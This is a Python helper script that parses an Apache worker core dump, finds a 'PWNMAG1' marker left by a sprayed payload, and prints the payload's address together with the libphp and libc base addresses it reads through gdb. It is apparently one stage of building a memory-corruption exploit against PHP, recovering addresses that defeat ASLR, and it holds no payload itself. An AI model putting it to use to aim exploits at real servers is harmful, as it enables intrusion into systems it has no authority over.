#!/usr/bin/env python3
"""Extract S (payload block vaddr) + libphp/libc bases from an apache worker core.

Usage: core_scan.py <corefile>
Prints: S=0x... libphp=0x... libc=0x... magic_tag=...
"""
import struct, sys, subprocess, re

def elf_loads(data):
    if data[:4] != b"\x7fELF": raise SystemExit("not ELF")
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    loads = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        p_type, p_flags = struct.unpack_from("<II", data, off)
        p_offset, p_vaddr, _p_paddr, p_filesz = struct.unpack_from("<QQQQ", data, off + 8)
        if p_type == 1:
            loads.append((p_offset, p_vaddr, p_filesz))
    return loads

def off2vaddr(loads, off):
    for po, pv, sz in loads:
        if po <= off < po + sz:
            return pv + (off - po)
    return None

def maps_from_gdb(core):
    out = subprocess.run(["gdb", "--batch", "-c", core, "-ex", "info proc mappings"],
                         capture_output=True, text=True, timeout=60).stdout
    regs = {}
    for line in out.splitlines():
        m = re.match(r"\s*(0x[0-9a-f]+)\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)\s*(\S*)", line)
        if m:
            start, end, sz, off, name = m.groups()
            if name and name not in regs:
                regs[name] = int(start, 16)
    return regs, out

def main():
    core = sys.argv[1]
    data = open(core, "rb").read()
    loads = elf_loads(data)
    idx = data.find(b"PWNMAG1")
    if idx < 0:
        print("NOMAGIC"); return
    vaddr = off2vaddr(loads, idx)
    S = vaddr - 0xC0
    tag = data[idx+8:idx+16].rstrip(b"\x00").decode()
    regs, raw = maps_from_gdb(core)
    libphp = None; libc = None
    for name, base in regs.items():
        if "libphp" in name and libphp is None: libphp = base
        if "libc.so" in name and libc is None: libc = base
    print(f"S=0x{S:x} magic_tag={tag} libphp=0x{(libphp or 0):x} libc=0x{(libc or 0):x}")

if __name__ == "__main__":
    main()
